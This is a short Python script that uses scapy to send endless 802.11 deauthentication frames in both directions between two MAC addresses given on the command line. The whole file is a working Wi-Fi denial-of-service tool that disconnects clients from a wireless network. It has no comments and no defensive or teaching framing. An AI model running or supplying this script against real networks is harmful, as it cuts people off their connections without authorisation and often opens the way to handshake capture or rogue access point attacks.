#!/usr/bin/python

from scapy.all import sendp
import sys
import scapy.layers.dot11 as dot11
import time

def deauth(src , dst , interface):

    pkt1 = dot11.RadioTap()/dot11.Dot11(addr1=src, addr2=dst, addr3=src)/dot11.Dot11Deauth()
    pkt2 = dot11.RadioTap()/dot11.Dot11(addr1=dst, addr2=src, addr3=src)/dot11.Dot11Deauth()

    while True:
        sendp(pkt1, iface=interface)
        sendp(pkt2, iface=interface)

def main():
    deauth(sys.argv[1] , sys.argv[2] , sys.argv[3])

if __name__ == "__main__":
    main()